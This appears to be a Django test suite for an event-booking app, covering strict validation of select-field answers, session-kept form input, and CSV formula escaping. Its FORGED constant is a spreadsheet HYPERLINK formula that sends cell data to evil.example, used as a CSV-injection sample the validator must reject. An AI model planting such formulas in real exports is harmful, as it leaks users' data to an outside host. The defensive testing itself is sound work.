"""FB-33 стопка 13, срез D6: значение select анкеты события — только из списка вариантов.

Дефект: `registration.collect` принимал любую строку ≤ 500 знаков, вариантов не сверял —
подделанный POST (`reg_diet="=HYPERLINK(...)"`) ложился в билет, ростер и письма.

Решение владельца (2026-11-24): значение select принимается ТОЛЬКО из списка вариантов,
иначе — ошибка поля и возврат введённого. Прежний ответ слота участника (старый вариант,
ручная правка) пересохраняется как был. CSV — экранирование `= + - @ \\t \\r` для всех полей
одним помощником `apps/core/csv_safe.py::csv_safe`.
"""

import pathlib
import re
import time
import uuid
from datetime import timedelta
from unittest import mock

import polib
import pytest
from django.conf import settings
from django.contrib.messages import get_messages
from django.contrib.messages.middleware import MessageMiddleware
from django.contrib.sessions.middleware import SessionMiddleware
from django.test import RequestFactory
from django.utils import timezone, translation
from django.utils.translation import ngettext

from apps.events import participants, public_views, registration, views
from apps.events.models import Event, Ticket, TicketParticipant
from apps.events.services import book_ticket
from apps.events.tests.test_logistics import _cab
from apps.tenants.tests.factories import TenantFactory

pytestmark = pytest.mark.django_db

MSG_DE = "Bitte bei „%(field)s“ einen Eintrag aus der Liste wählen."


def _summary(n):
    return ngettext("Bitte %(n)s Angabe korrigieren.", "Bitte %(n)s Angaben korrigieren.", n) % {
        "n": n
    }


FORGED = '=HYPERLINK("http://evil.example/?x="&A1,"Klick")'
LOCALES = ["de", "en", "tr", "ru", "uk"]


@pytest.fixture(autouse=True)
def _urlconf(settings):
    settings.ROOT_URLCONF = "config.urls_tenant"


def _event(**kw):
    data = {
        "title": "Retreat",
        "starts_at": timezone.now() + timedelta(days=20),
        "status": Event.STATUS_PUBLISHED,
        "price_cents": 0,
        "capacity": 20,
        "questions": ["Anreise mit?"],
        "registration_fields": ["country", "diet", "experience", "medical"],
    }
    data.update(kw)
    return Event.objects.create(**data)


def _req(method="post", data=None, session_from=None):
    request = getattr(RequestFactory(), method)("/veranstaltung/", data or {})
    request.META["REMOTE_ADDR"] = f"10.{uuid.uuid4().int % 250}.{uuid.uuid4().int % 250}.7"
    SessionMiddleware(lambda r: None).process_request(request)
    MessageMiddleware(lambda r: None).process_request(request)
    if session_from is not None:
        request.session = session_from.session
        request._messages = session_from._messages
        # браузер гостя, у которого уже есть сессия, шлёт её cookie
        request.COOKIES[settings.SESSION_COOKIE_NAME] = "stand-in"
    request.tenant = getattr(session_from, "tenant", None) or TenantFactory.build()
    return request


def _book(event, data):
    request = _req("post", data)
    resp = public_views.veranstaltung_book(request, pk=event.pk)
    return request, resp


def _detail(event, session_from=None, lang="de"):
    request = _req("get", session_from=session_from)
    with translation.override(lang):
        resp = public_views.veranstaltung_detail(request, pk=event.pk)
    return resp, resp.content.decode()


def _form(html):
    found = re.search(r'<form method="post" action="[^"]*/buchen/".*?</form>', html, re.S)
    assert found, "нет формы брони"
    return found.group(0)


def _select(html, name):
    found = re.search(rf'<select name="{name}".*?</select>', html, re.S)
    assert found, f"нет <select name={name}>"
    return found.group(0)


GOOD = {
    "name": "Anna Gast",
    "email": "anna@gast.de",
    "phone": "0170 123",
    "quantity": "2",
    "q0": "Bahn",
    "reg_country": "Österreich",
    "reg_experience": "Mittel",
    "reg_medical": "Rücken",
}


# --- №6 / №7: подделка select на брони ---------------------------------------------
def test_invalid_select_no_ticket_input_kept():
    """Подделанный вариант: билета нет, сообщение с подписью поля, введённое — в форме."""
    event = _event()
    request, resp = _book(event, {**GOOD, "reg_diet": FORGED})
    assert resp.status_code == 302
    assert not Ticket.objects.filter(event=event).exists()
    texts = [str(m) for m in get_messages(request)]
    assert texts == [_summary(1)]
    _resp, html = _detail(event, session_from=request)
    form = _form(html)
    assert 'value="Anna Gast"' in form and 'value="anna@gast.de"' in form
    assert 'value="0170 123"' in form and 'value="2"' in form
    assert 'value="Bahn"' in form and 'value="Österreich"' in form
    # Art. 9 (здоровье) в сессию не кладётся — гость вводит заново
    assert "Rücken" not in html
    assert '<option value="Mittel" selected>' in _select(form, "reg_experience")
    # подделанное значение не возвращается ни вариантом, ни текстом
    assert "HYPERLINK" not in html and "evil.example" not in html
    assert " selected" not in _select(form, "reg_diet")


def test_kept_input_shown_once():
    event = _event()
    request, _resp = _book(event, {**GOOD, "reg_diet": "Paleo"})
    _detail(event, session_from=request)
    _resp, html = _detail(event, session_from=request)
    assert "Anna Gast" not in html


def test_kept_input_other_event_slot_not_taken():
    """Слот одного события не виден и не снимается на странице другого (pop — по pk)."""
    event, other = _event(), _event(title="Anderes")
    request, _resp = _book(event, {**GOOD, "reg_diet": "Paleo"})
    _resp, html = _detail(other, session_from=request)
    assert "Anna Gast" not in html
    _resp, html = _detail(event, session_from=request)
    assert "Anna Gast" in html


def test_kept_input_expires():
    event = _event()
    request, _resp = _book(event, {**GOOD, "reg_diet": "Paleo"})
    slot = request.session[public_views.EVENT_INPUT_KEY]
    slot["ts"] -= public_views.EVENT_INPUT_TTL + 1
    request.session[public_views.EVENT_INPUT_KEY] = slot
    _resp, html = _detail(event, session_from=request)
    assert "Anna Gast" not in html


def test_kept_slot_shape_is_bounded():
    """Один слот `{pk, data, ts}`: `q*` — не больше вопросов события, `reg_*` — из реестра,
    каждое значение ≤ 500."""
    event = _event()
    post = {**GOOD, "reg_diet": "Paleo", "q0": "x" * 900, "q7": "lauter", "reg_evil": "y"}
    request, _resp = _book(event, post)
    slot = request.session[public_views.EVENT_INPUT_KEY]
    assert set(slot) == {"pk", "data", "ts"}
    assert slot["pk"] == str(event.pk)
    data = slot["data"]
    assert [q["value"] for q in data["questions"]] == ["x" * 500]
    assert set(data["reg"]) <= set(registration.VALID_KEYS)
    assert "diet" not in data["reg"] and "evil" not in data["reg"]
    assert data["errors"] == ["diet"]


def test_kept_input_not_visible_to_other_session():
    event = _event()
    _book(event, {**GOOD, "reg_diet": "Paleo"})
    _resp, html = _detail(event)  # другая (новая) сессия
    assert "Anna Gast" not in html


def test_kept_input_not_cached(settings):
    """Страница события вне страничного кэша; с введённым — ещё и `no-store`: вторая сессия
    введённого не видит даже при включённом кэше."""
    settings.PUBLIC_PAGE_CACHE_TTL = 300
    event = _event()
    request, _resp = _book(event, {**GOOD, "reg_diet": "Paleo"})
    resp, html = _detail(event, session_from=request)
    assert "Anna Gast" in html
    assert "no-store" in resp.get("Cache-Control", "")
    _resp2, html2 = _detail(event)
    assert "Anna Gast" not in html2


def test_valid_select_books_as_before():
    """Негативный контроль: вариант из списка проходит, билет создаётся."""
    event = _event()
    request, resp = _book(event, {**GOOD, "reg_diet": "Kindermenü"})
    assert resp.status_code == 302
    ticket = Ticket.objects.get(event=event)
    assert ticket.answers["diet"] == "Kindermenü"
    assert "event_input" not in request.session


def test_event_free_question_capped():
    event = _event()
    _book(event, {**GOOD, "q0": "z" * 900})
    ticket = Ticket.objects.get(event=event)
    assert ticket.answers["Anreise mit?"] == "z" * 500


# --- №5: точное совпадение ---------------------------------------------------------
@pytest.mark.parametrize(
    "value,ok",
    [("Vegan", True), ("Vegan ", True), ("vegan", False), ("Vegan​", False), ("", True)],
)
def test_value_exact(value, ok):
    bad = registration.invalid_selects(["diet"], {"reg_diet": value})
    assert (bad == []) is ok
    if ok and value.strip():
        assert registration.collect(["diet"], {"reg_diet": value}) == {"diet": "Vegan"}


def test_invalid_selects_keep_and_prefix():
    assert registration.invalid_selects(["diet"], {"p2_reg_diet": "Paleo"}, prefix="p2_reg_") == [
        "diet"
    ]
    assert (
        registration.invalid_selects(
            ["diet"], {"p2_reg_diet": "Paleo"}, prefix="p2_reg_", keep={"diet": "Paleo"}
        )
        == []
    )
    # текстовые поля не сверяются
    assert registration.invalid_selects(["country"], {"reg_country": "=1+1"}) == []


def test_select_error_label_from_registry():
    with translation.override("de"):
        assert registration.select_error("diet") == MSG_DE % {"field": "Ernährung"}


# --- №15: без сохранённого ввода форма прежняя --------------------------------------
def test_event_detail_unchanged_without_kept():
    """Слот ЧУЖОГО события в сессии не меняет разметку страницы (байт-в-байт с пустой)."""
    event, other = _event(), _event(title="Anderes")
    request, _resp = _book(other, {**GOOD, "reg_diet": "Paleo"})
    list(get_messages(request))  # сообщение брони другого события — не про разметку
    fresh = _req("get")
    fresh.tenant = request.tenant
    _r, plain = _detail(event, session_from=fresh)
    carrier = _req("get")
    carrier.session, carrier.tenant = request.session, request.tenant
    _r, with_foreign = _detail(event, session_from=carrier)
    strip = re.compile(r'name="(csrfmiddlewaretoken|form_token)" value="[^"]*"')
    assert strip.sub("", plain) == strip.sub("", with_foreign)
    assert "aria-invalid" not in plain


# --- №22: ошибка поля описана -------------------------------------------------------
def test_field_error_described():
    event = _event()
    request, _resp = _book(event, {**GOOD, "reg_diet": "Paleo"})
    _r, html = _detail(event, session_from=request)
    diet = _select(html, "reg_diet")
    assert 'aria-invalid="true"' in diet
    assert 'aria-describedby="reg_diet-error"' in diet
    assert re.search(r'id="reg_diet-error"[^>]*>[^<]*Ernährung', html)
    assert "aria-invalid" not in _select(html, "reg_experience")
    assert _form(html).count('aria-invalid="true"') == 1


# --- №26: потолок длины в разметке -------------------------------------------------
def test_reg_text_maxlength():
    _r, html = _detail(_event())
    form = _form(html)
    assert re.search(r'<input name="reg_country" maxlength="500"', form)
    assert re.search(r'<textarea name="reg_medical" maxlength="500"', form)
    assert re.search(r'<input name="q0" maxlength="500"', form)


# --- участники: гость и кабинет ----------------------------------------------------
class _Tenant:
    stripe_connect_id = ""
    site_config = {}

    def is_module_active(self, name):
        return True


def _ticket(event, quantity=2):
    return book_ticket(event, name="Anna", email="anna@t.de", quantity=quantity, auto_confirm=True)


def _guest_post(ticket, data):
    from django.contrib.messages.storage.fallback import FallbackStorage

    req = RequestFactory().post("/", data)
    req.tenant = _Tenant()
    req.session = {}
    req._messages = FallbackStorage(req)
    return public_views.veranstaltung_participants(req, participants.token(ticket))


def _cabinet_post(ticket, data):
    req = _cab("post", {"action": "participants", **data})
    with mock.patch("apps.core.permissions.has_perm", return_value=True):
        resp = views.ticket_action(req, pk=ticket.event_id, tid=ticket.pk)
    return req, resp


@pytest.mark.parametrize("page", ["guest", "cabinet"])
def test_participants_invalid_select_nothing_saved(page):
    event = _event(registration_fields=["diet"])
    ticket = _ticket(event)
    TicketParticipant.objects.create(ticket=ticket, position=1, name="Anna", answers={})
    post = {"p1_name": "Anna Neu", "p2_name": "Ben", "p2_reg_diet": FORGED}
    if page == "guest":
        resp = _guest_post(ticket, post)
        assert resp.status_code == 200
        assert "no-store" in resp.get("Cache-Control", "")
        html = resp.content.decode()
        assert 'value="Anna Neu"' in html and 'value="Ben"' in html
        sel = _select(html, "p2_reg_diet")
        assert 'aria-invalid="true"' in sel and 'aria-describedby="p2_reg_diet-error"' in sel
        assert 'id="p2_reg_diet-error"' in html
        assert "HYPERLINK" not in html
        assert "Ernährung" in html
    else:
        req, resp = _cabinet_post(ticket, post)
        assert resp.status_code == 302
        texts = [str(m) for m in get_messages(req)]
        assert any(MSG_DE % {"field": "Ernährung"} in t for t in texts)
        assert "Teilnehmerdaten gespeichert." not in texts
    rows = {
        p.position: (p.name, p.answers) for p in TicketParticipant.objects.filter(ticket=ticket)
    }
    assert rows == {1: ("Anna", {})}


def test_participants_error_in_later_slot_writes_nothing():
    """Сначала проверка всех слотов, потом запись: ошибка в слоте 3 не оставляет записанными
    слоты 1 и 2."""
    ticket = _ticket(_event(registration_fields=["diet"]), quantity=3)
    with pytest.raises(participants.InvalidAnswers) as exc:
        participants.save(
            ticket,
            {
                "p1_name": "A",
                "p1_reg_diet": "Vegan",
                "p2_name": "B",
                "p3_name": "C",
                "p3_reg_diet": "Paleo",
            },
            source="cabinet",
        )
    assert exc.value.errors == {3: ["diet"]}
    assert not TicketParticipant.objects.filter(ticket=ticket).exists()


def test_legacy_value_kept_on_resave():
    """Прежний ответ слота вне списка (старый вариант) пересохраняется как был."""
    ticket = _ticket(_event(registration_fields=["diet"]))
    TicketParticipant.objects.create(
        ticket=ticket, position=1, name="Anna", answers={"diet": "Paleo <alt>"}
    )
    saved = participants.save(
        ticket, {"p1_name": "Anna", "p1_reg_diet": "Paleo <alt>"}, source="guest"
    )
    assert saved == 1
    assert TicketParticipant.objects.get(ticket=ticket, position=1).answers == {
        "diet": "Paleo <alt>"
    }


def test_legacy_value_of_other_slot_not_accepted():
    """`keep` — из строки ЭТОГО слота в БД, не из POST и не из соседнего слота."""
    ticket = _ticket(_event(registration_fields=["diet"]))
    TicketParticipant.objects.create(
        ticket=ticket, position=1, name="Anna", answers={"diet": "Paleo"}
    )
    with pytest.raises(participants.InvalidAnswers):
        participants.save(ticket, {"p2_name": "Ben", "p2_reg_diet": "Paleo"}, source="guest")
    assert not TicketParticipant.objects.filter(ticket=ticket, position=2).exists()


def test_hide_contacts_with_legacy_select_keeps_both():
    ticket = _ticket(_event(registration_fields=["diet", "emergency_contact"]))
    TicketParticipant.objects.create(
        ticket=ticket,
        position=2,
        name="Ben",
        answers={"diet": "Paleo", "emergency_contact": "Mama 0170"},
    )
    participants.save(
        ticket,
        {"p2_name": "Ben B.", "p2_reg_diet": "Paleo"},
        source="cabinet",
        hide_contacts=True,
    )
    row = TicketParticipant.objects.get(ticket=ticket, position=2)
    assert row.answers == {"diet": "Paleo", "emergency_contact": "Mama 0170"}


def test_participants_valid_select_saves():
    """Негативный контроль: вариант из списка сохраняется, гость — redirect, как раньше."""
    ticket = _ticket(_event(registration_fields=["diet"]))
    resp = _guest_post(ticket, {"p1_name": "Anna", "p2_name": "Ben", "p2_reg_diet": "Vegan"})
    assert resp.status_code == 302
    assert TicketParticipant.objects.get(ticket=ticket, position=2).answers == {"diet": "Vegan"}


# --- CSV ------------------------------------------------------------------------
def _roster(event):
    req = _cab("get")
    with mock.patch("apps.core.permissions.has_perm", return_value=True):
        return views.roster_csv(req, pk=event.pk).content.decode("utf-8-sig")


def test_roster_header_question_formula_escaped():
    event = _event(questions=["=1+1", "Normal?"], registration_fields=["country"])
    header = _roster(event).splitlines()[0].split(";")
    assert "'=1+1" in header and "=1+1" not in header
    assert "Normal?" in header


@pytest.mark.parametrize("prefix", ["=", "+", "-", "@", "\t", "\r"])
def test_roster_all_user_cells_escaped(prefix):
    import csv
    import io

    event = _event(questions=["Frage?"], registration_fields=["country"])
    ticket = book_ticket(
        event,
        name=f"{prefix}Name",
        email="gast@t.de",
        phone=f"{prefix}0170",
        quantity=2,
        answers={"Frage?": f"{prefix}Antwort", "country": f"{prefix}Land"},
        auto_confirm=True,
    )
    TicketParticipant.objects.create(
        ticket=ticket, position=2, name=f"{prefix}Ben", answers={"country": f"{prefix}AT"}
    )
    rows = list(csv.reader(io.StringIO(_roster(event)), delimiter=";"))
    cells = [c for row in rows[1:] for c in row]
    for raw in (
        f"{prefix}Name",
        f"{prefix}0170",
        f"{prefix}Antwort",
        f"{prefix}Land",
        f"{prefix}AT",
    ):
        assert raw not in cells, raw
        assert "'" + raw in cells or any(("'" + raw) in c for c in cells), raw


# --- №16: строки во всех пяти .po ----------------------------------------------------
@pytest.mark.parametrize("lang", LOCALES)
def test_d6_msgids_in_all_po(lang):
    path = pathlib.Path(settings.BASE_DIR) / "locale" / lang / "LC_MESSAGES" / "django.po"
    po = polib.pofile(str(path))
    hits = [e for e in po if e.msgid == MSG_DE and not e.msgctxt and not e.obsolete]
    assert len(hits) == 1, lang
    assert hits[0].msgstr and not hits[0].fuzzy
    assert "%(field)s" in hits[0].msgstr


# --- ревью диффа D6 (план §10.5) ---------------------------------------------------
def test_event_input_slot_excludes_medical():
    """Art. 9: здоровье, аллергии, экстренный контакт, дата рождения — не в слот сессии."""
    event = _event(
        registration_fields=[
            "country",
            "diet",
            "medical",
            "allergies",
            "emergency_contact",
            "birth_date",
        ]
    )
    post = {
        **GOOD,
        "reg_diet": "Paleo",
        "reg_allergies": "Nüsse",
        "reg_emergency_contact": "Mama 0170",
        "reg_birth_date": "1990-01-01",
    }
    request, _resp = _book(event, post)
    reg = request.session[public_views.EVENT_INPUT_KEY]["data"]["reg"]
    assert reg == {"country": "Österreich"}
    assert set(registration.NO_ECHO_KEYS) == {
        "medical",
        "allergies",
        "emergency_contact",
        "birth_date",
    }
    _r, html = _detail(event, session_from=request)
    for value in ("Rücken", "Nüsse", "Mama 0170", "1990-01-01"):
        assert value not in html


def test_event_input_expired_slot_removed_on_foreign_event():
    event, other = _event(), _event(title="Anderes")
    request, _resp = _book(event, {**GOOD, "reg_diet": "Paleo"})
    slot = request.session[public_views.EVENT_INPUT_KEY]
    slot["ts"] -= public_views.EVENT_INPUT_TTL + 1
    request.session[public_views.EVENT_INPUT_KEY] = slot
    _detail(other, session_from=request)
    assert public_views.EVENT_INPUT_KEY not in request.session


def test_no_session_read_without_cookie():
    """Без cookie сессии слот D6 не читается и не снимается. (`Vary: Cookie` у витрины и так
    есть: сессию читают контекстные процессоры `modules_nav` — кабинет клиента и столик.)"""
    event = _event()
    request = _req("get")
    asked = []
    real_get, real_pop = request.session.get, request.session.pop
    request.session.get = lambda key, *a: asked.append(key) or real_get(key, *a)
    request.session.pop = lambda key, *a: asked.append(key) or real_pop(key, *a)
    public_views.veranstaltung_detail(request, pk=event.pk)
    assert public_views.EVENT_INPUT_KEY not in asked
    # с cookie — читается (контроль, что замок видит чтение)
    request = _req("get")
    request.COOKIES[settings.SESSION_COOKIE_NAME] = "stand-in"
    asked.clear()
    real_get = request.session.get
    request.session.get = lambda key, *a: asked.append(key) or real_get(key, *a)
    public_views.veranstaltung_detail(request, pk=event.pk)
    assert public_views.EVENT_INPUT_KEY in asked


class _BrokenSession(dict):
    def __setitem__(self, key, value):
        raise RuntimeError("session store down")


def test_session_write_failure_logged(caplog):
    event = _event()
    request = _req("post", {**GOOD, "reg_diet": "Paleo"})
    request.session = _BrokenSession()
    with caplog.at_level("WARNING", logger="apps.events.public_views"):
        resp = public_views.veranstaltung_book(request, pk=event.pk)
    assert resp.status_code == 302
    assert not Ticket.objects.filter(event=event).exists()
    hits = [r for r in caplog.records if r.levelname == "WARNING" and r.exc_info]
    assert hits and "event input" in hits[0].getMessage()


def test_one_summary_message_and_field_texts():
    """Одна ошибка — одно объявление: одно сводное сообщение, подробность — у полей; на
    странице сводка ровно один раз (локальный цикл сообщений карточки снят)."""
    event = _event()
    request, _resp = _book(event, {**GOOD, "reg_diet": "Paleo", "reg_experience": "Profi"})
    carrier = _req("get")
    carrier.session, carrier.tenant = request.session, request.tenant
    carrier.COOKIES[settings.SESSION_COOKIE_NAME] = "stand-in"
    carrier._messages = request._messages
    _r, html = _detail(event, session_from=carrier)
    assert html.count(_summary(2)) == 1
    assert 'id="reg_diet-error"' in html and 'id="reg_experience-error"' in html
    assert html.count(MSG_DE % {"field": "Ernährung"}) == 1  # только у поля


def test_guest_one_summary_message():
    ticket = _ticket(_event(registration_fields=["diet"]))
    resp = _guest_post(ticket, {"p1_name": "A", "p2_name": "B", "p2_reg_diet": "Paleo"})
    html = resp.content.decode()
    assert html.count(_summary(1)) == 1
    assert html.count(MSG_DE % {"field": "Ernährung"}) == 1


def test_event_input_restores_tier_and_extras():
    from apps.core.models import Extra

    event = _event(
        tiers=[
            {"label": "Frühbucher", "price_cents": 0},
            {"label": "Standard", "price_cents": 0},
        ]
    )
    extra = Extra.objects.create(scope=Extra.SCOPE_EVENTS, label="Bio-Mittag", price_cents=0)
    post = {
        **GOOD,
        "reg_diet": "Paleo",
        "tier": "Standard",
        "extra": [str(extra.pk), "fremd"],
        "voucher_code": "GS-ABC",
        "waiver_name": "Anna Gast",
    }
    request, _resp = _book(event, post)
    data = request.session[public_views.EVENT_INPUT_KEY]["data"]
    assert data["tier"] == "Standard" and data["extras"] == [str(extra.pk)]
    assert "voucher_code" not in data and "waiver_name" not in data
    _r, html = _detail(event, session_from=request)
    form = _form(html)
    assert re.search(r'name="tier" value="Standard"[^>]*checked', form)
    assert not re.search(r'name="tier" value="Frühbucher"[^>]*checked', form)
    assert re.search(rf'name="extra" value="{extra.pk}"[^>]*checked', form)
    assert "GS-ABC" not in form


def test_event_input_unknown_tier_not_kept():
    event = _event(tiers=[{"label": "Standard", "price_cents": 0}])
    request, _resp = _book(event, {**GOOD, "reg_diet": "Paleo", "tier": "Erfunden"})
    assert request.session[public_views.EVENT_INPUT_KEY]["data"]["tier"] == ""


def test_all_field_types_described_and_one_autofocus():
    """`aria-invalid`/`aria-describedby` и рамка — у поля с ошибкой любого типа;
    `autofocus` — только у первого."""
    event = _event()
    request = _req("get")
    request.session[public_views.EVENT_INPUT_KEY] = {
        "pk": str(event.pk),
        "data": {"name": "A", "errors": ["country", "diet", "medical"]},
        "ts": int(time.time()),
    }
    request.COOKIES[settings.SESSION_COOKIE_NAME] = "stand-in"
    _r, html = _detail(event, session_from=request)
    form = _form(html)
    for name, tag in (
        ("reg_country", "input"),
        ("reg_diet", "select"),
        ("reg_medical", "textarea"),
    ):
        el = re.search(rf'<{tag} name="{name}"[^>]*>', form).group(0)
        assert 'aria-invalid="true"' in el and f'aria-describedby="{name}-error"' in el, name
        assert "border-red-600" in el, name
    assert form.count("autofocus") == 1
    assert re.search(r'<input name="reg_country"[^>]*autofocus', form)


def test_cabinet_message_names_position():
    ticket = _ticket(_event(registration_fields=["diet"]), quantity=3)
    req, _resp = _cabinet_post(
        ticket, {"p1_name": "A", "p2_name": "B", "p2_reg_diet": "Paleo", "p3_name": "C"}
    )
    texts = [str(m) for m in get_messages(req)]
    assert len(texts) == 1 and "Person 2" in texts[0] and "Ernährung" in texts[0]
    assert not TicketParticipant.objects.filter(ticket=ticket).exists()


@pytest.mark.parametrize("lang", LOCALES)
def test_d6_summary_msgid_in_all_po(lang):
    path = pathlib.Path(settings.BASE_DIR) / "locale" / lang / "LC_MESSAGES" / "django.po"
    po = polib.pofile(str(path))
    hits = [e for e in po if e.msgid == "Bitte %(n)s Angabe korrigieren." and not e.obsolete]
    assert len(hits) == 1, lang
    assert hits[0].msgid_plural == "Bitte %(n)s Angaben korrigieren."
    assert all(v for v in hits[0].msgstr_plural.values())
